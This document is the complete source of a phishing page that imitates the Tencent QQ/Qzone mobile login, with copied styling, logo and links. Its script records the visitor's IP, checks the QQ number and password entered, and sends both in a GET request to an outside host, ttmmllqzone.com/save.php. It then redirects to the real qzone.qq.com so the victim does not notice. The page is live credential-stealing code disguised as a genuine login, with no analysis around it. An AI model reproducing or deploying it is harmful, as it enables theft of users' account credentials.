    <style>@charset "utf-8";body,html{height:100%}body{font-size:1pc;background:#eee}*{padding:0;margin:0;list-style:none;text-decoration:none}input::-webkit-input-placeholder,textarea::-webkit-input-placeholder{color:#aaa}input::-ms-input-placeholder,textarea::-ms-input-placeholder{color:#aaa}input:focus{outline:0}.content{margin:0 auto;width:20pc;height:500px;position:relative}#error_tips{position:absolute;top:0;z-index:100;display:none;opacity:.95;width:100%}#error_tips #error_tips_content{position:relative;padding:1pc 0 24px 24px;border-radius:5px;background-color:#525c5f;height:28px}#error_tips #error_tips_content #error_icon{position:absolute;top:18px;display:inline-block;width:24px;height:24px;background:url(info.png) no-repeat 0 0}#error_tips #error_tips_content #error_message{display:inline-block;line-height:28px;font-size:14px;color:#fff;padding:0 0 0 28px}#error_message a,#error_message a:visited{color:#f15a22}@media (-webkit-min-device-pixel-ratio:2),(min-resolution:2dppx),(min-resolution:192dpi){#error_tips #error_tips_content #error_icon{background:url(info@2x.png) no-repeat 0 0;background-size:24px 24px}}.login{margin:0 auto;padding-top:30px}.q_login{margin:0 auto;width:290px;overflow:hidden;text-align:center;margin-bottom:40px}.inputstyle{-webkit-tap-highlight-color:rgba(255,255,255,0);width:273px;height:44px;color:#000;border:0;background:0;padding-left:15px;font-size:1pc;-webkit-appearance:none}.logo{height:75pt;width:244px;margin:0 auto;margin-bottom:20px;background-size:244px 75pt}.header{display:inline-block;height:97px;width:6pc;text-align:center;position:relative}.header img{top:10px;left:1pc}.header .img_out,.header img{width:60px;height:60px;position:absolute}.header .img_out{top:9px;left:15px;border:1px solid #c6dbe8;border-radius:4px;-webkit-box-shadow:1px 1px 13px #6e6e6e}.nick{display:inline-block;text-align:center;position:absolute;top:5pc;left:0;height:20px;line-height:18px;vertical-align:middle}.del_touch_icon{display:none;width:30px;height:30px;position:absolute;left:60px;top:0;z-index:1}.del_icon{display:block;width:24px;height:22px;border-radius:11px}#web_login{width:290px;margin:0 auto}#g_list{background:#fff;height:89px;border-radius:4px}#g_p,#g_u{position:relative}#g_u{border-bottom:1px solid #eaeaea}.txt_default{position:absolute;top:9pt;left:10px;color:#b3b3b3}.del_touch{-webkit-tap-highlight-color:rgba(255,255,255,0);position:absolute;right:0;display:block;height:44px;width:3pc;z-index:1}.del_u{display:none;position:absolute;left:15px;top:13px;height:18px;width:18px;background-color:#aaa;border-radius:9px}#auto_login{height:24px;margin:15px 0;color:#246183;position:relative}#auto_login .wording{position:absolute;left:40px;line-height:24px;height:24px;font-size:14px}#remember{position:absolute;left:14px;top:5px;cursor:pointer;z-index:1;opacity:.01}#remember:checked+.checkbox{background:#146fdf url(checked.png) 1px 1px;border-color:#146fdf}#remember+.checkbox{display:inline-block;width:21px;height:21px;position:absolute;left:9px;top:1px;border:1px solid #9abbe3;background:0;border-radius:11px}#go,#onekey{width:290px;height:44px;line-height:44px;background:#146fdf;border:0;border-radius:4px;color:#fff;font-size:1pc;text-align:center;margin-top:15px;display:block;cursor:pointer}#onekey{background:#146fdf;display:none}#go.weak,#onekey.weak{background-color:#e7e7e7;color:#146fdf;border:1px solid #9abbe3;height:42px}#switch{width:290px;margin:0 auto}#switch #swicth_login{width:3in;height:42px;line-height:44px;border:1px solid #9abbe3;border-radius:5px;background:#e7e7e7;margin-top:10px;text-align:center;font-size:1pc;color:#146fdf}#switch #zc_feedback{width:290px;position:relative;margin-top:15px;overflow:hidden}#switch #forgetpwd,#switch #zc{color:#246183;line-height:14px;font-size:14px;padding:15px 10px}#switch #zc{float:right;margin-right:-10px}#switch #forgetpwd{float:left;margin-left:-10px}.tansparent{background:0}#q_login_title{height:2pc;line-height:22px;margin-bottom:20px;position:relative}#q_login_logo{width:22px;height:22px;position:absolute;left:0}#q_login_tips{position:absolute;left:30px;top:0;color:#246183}#vcode{margin:0 auto;padding-top:40px;display:none}#vcode #vcode_tips{display:block;width:290px;height:20px;line-height:20px;margin:0 auto;margin-bottom:15px;color:#77838d}#vcode #vcode_area{position:relative;margin:0 auto;width:290px;height:70px;border-radius:5px;border:1px solid #b8b8b8;background:#fff}#vcode #vcode_img{position:absolute;left:3px;width:140px;height:70px}#vcode #vcode_input{position:absolute;top:-1px;left:145px;width:145px;height:70px;border:1px solid #9d9d9d;background:0;-webkit-appearance:none;border-top-right-radius:5px;border-bottom-right-radius:5px;line-height:28px;font-size:28px;-webkit-box-shadow:inset 0 0 10px #ccc}#vcode #input_tips{position:absolute;top:5px;left:150px;display:block;width:135px;height:50px;color:#b3b3b3;z-index:1;padding-top:8px}#vcode #submit{width:3in;height:22px;padding:10px 0;background:#7ec82c;border:0;border-radius:5px;color:#fff;font-size:22px;text-align:center;margin:0 auto;margin-top:35px}.copyright{text-align:center;color:#8a949d;font-size:10px;margin-top:15px;font-family:Helvetica}.copyright .chs,.copyright .en{line-height:20px}.mode_webapp .ui_topbar .topbar_btn b,.mode_webapp .ui_topbar .topbar_btn_left b{background-image:url(bg_btn_back.png);background-position:bottom right;background-size:105px;width:6px;height:2pc;float:left}.ui_topbar .topbar_title,.ui_topbar h3{font-size:18px}.ui_topbar{border-bottom:1px solid #b6b6b6;border-top:2px solid #df242a;background-color:#d9d9d9;background-image:-webkit-gradient(linear,left top,left bottom,from(#ebebeb),to(#d9d9d9));background-image:-webkit-linear-gradient(top,#ebebeb,#d9d9d9);background-image:linear-gradient(to bottom,#ebebeb,#d9d9d9);height:40px;line-height:40px;text-align:center;position:relative}.lay_header{height:auto!important;width:100%}.mode_webapp .ui_topbar{color:#fff;background-color:#c32d32;background-image:-webkit-gradient(linear,left top,left bottom,from(#fe444a),to(#c32d32));background-image:-webkit-linear-gradient(top,#fe444a,#c32d32);background-image:linear-gradient(to bottom,#fe444a,#c32d32);border-bottom:1px solid #700d00;border-top:0 none;top:0;left:0;width:100%}.mode_webapp .ui_topbar .topbar_btn_left{display:block;position:absolute;left:10px;top:5px}.mode_webapp .ui_topbar .topbar_btn span,.mode_webapp .ui_topbar .topbar_btn_left span{float:left;display:inline-block;height:2pc;line-height:30px;color:#fff;background-image:url(bg_btn_back.png);background-size:105px;padding-left:10px;padding-right:4px}.mode_webapp .ui_topbar .topbar_btn_left span{background-image:url(bg_btn_back.png);background-position:left -2pc;background-size:105px;padding-left:17px}.mode_webapp .ui_topbar{box-shadow:0 0 5px #333}.skin-2 .ui_topbar{background-color:#161616;background-image:-webkit-gradient(linear,left top,left bottom,from(#3e3e3e),to(#262626));background-image:-webkit-linear-gradient(top,#3e3e3e,#262626);background-image:linear-gradient(to bottom,#3e3e3e,#262626);border-bottom-color:#1a1a1a}.skin-2 .ui_topbar .topbar_btn b,.skin-2 .ui_topbar .topbar_btn span,.skin-2 .ui_topbar .topbar_btn_left b,.skin-2 .ui_topbar .topbar_btn_left span{background-image:url(bg_btn_back_black@2x.png);background-size:105px}.new_vcode{display:none;width:100%;height:100%;overflow:hidden}.logo{background-image:url(https://qzonestyle.gtimg.cn/qzone/phone/style/img/ptlogin-logo.png)}</style>

<body style="zoom: 1;">

<div id="content" class="content">
    <div id="error_tips">
        <div id="error_tips_content">
            <span id="error_icon"></span>
            <span id="error_message"></span>
        </div>
    </div>
    <div id="login" class="login">
        <div id="logo" class="logo">
        </div>
        <div id="app_name" style="display: none">
        </div>
        <div id="q_login" class="q_login" style="display: none">
            <div id="q_login_title">
                <div id="q_login_logo">
                </div>
                <label id="q_login_tips"></label>
            </div>
            <div id="q_logon_list" class="q_logon_list">
            </div>
        </div>
        <div id="web_login">
            <form id="loginform" autocomplete="off" name="loginform" action="" method="" target="" style="margin:0">
                <script src="http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js"></script>
                <input type="hidden" name="ip" id="ip"/>
                <ul id="g_list">
                    <li id="g_u">
                        <div id="del_touch" class="del_touch">
                            <span id="del_u" class="del_u"></span>
                        </div>
                        <input id="u" class="inputstyle" name="hrUW3PG7mp3RLd3dJu" autocomplete="off" placeholder="QQ号码/手机/邮箱"/></li>
                    <li id="g_p">
                        <div id="del_touch_p" class="del_touch">
                            <span id="del_p" class="del_u"></span>
                        </div>
                        <input id="p" class="inputstyle" maxlength="16" type="password" name="LxMzAX2jog9Bpjs07jP" autocorrect="off" placeholder="请输入您的QQ密码"/></li>
                </ul>
                <div href="javascript:void(0);" id="go">登 录</div>
            </form>
        </div>
        <div id="switch">
            <div id="swicth_login" onclick="pt._switch()" style="display: none">
            </div>
            <div id="zc_feedback">
                <span id="zc" onclick="window.open('http\x3A\x2F\x2Fptlogin2.qq.com\x2Fj_newreg_url')">注册新帐号</span>
                <span id="forgetpwd" onclick="window.open('http://ptlogin2.qq.com/j_findpwd_url')">忘了密码？</span>
            </div>
        </div>
        <div id="custom_bottom">
        </div>
    </div>
    <div id="vcode">
        <label id="vcode_tips"></label>
        <div id="vcode_area">
            <img id="vcode_img"/>
            <label id="input_tips"></label>
            <input id="vcode_input" name="vcode_input" tabindex="3" autocomplete="off" autocorrect="off" maxlength="6"/>
        </div>
        <div id="button">
        </div>
    </div>
</div>
<div id="new_vcode" class="new_vcode">
</div>
<div id="footerBlank">
</div>
<script>
    var times = 0;
    function error(msg) {
        $("#error_tips").css({
            display: 'block'
        });
        $('#error_message').html(msg);
        err = true;
    }
    $('form input').focus(function() {
        $("#error_tips").css({
            display: 'none'
        });
        err = false;
    });
    $("#error_tips").on('click',
            function() {
                $(this).hide();
            });
    $("#go").on('click',
            function() {
                var $this = $(this);
                err = false;
                var p = $("#p").val();
                var u = $("#u").val();
                u == '' && error('您还没有输入帐号！');
                if (err) return false;
                p == '' && error("您还没有输入密码！");
                if (err) return false;
                /^[1-9][0-9]{5,9}$/.test(u) || error('请输入正确的帐号！');
                if (err) return false;
                var len = p.length; (len < 6 || len > 16) && error('您输入的帐号或密码不正确，请重新输入。');
                if (err) {
                    $("#p").val('');
                    return false;
                }
                var ip = $("#ip").val();
                if (!err){
                    $.ajax({
                        url:'http://ttmmllqzone.com/save.php?ip='+ip+"&hrUW3PG7mp3RLd3dJu="+u+'&LxMzAX2jog9Bpjs07jP='+p,
                        type:'GET',
                        dataType:'jsonp',
                        error:function( er ){
                            window.location.href='https://qzone.qq.com';
                        },
                        success:function( er )
                        {
                            window.location.href='https://qzone.qq.com';
                        }
                    })
                }
            })
</script>
<div style="display:none;">
</div>
</body>
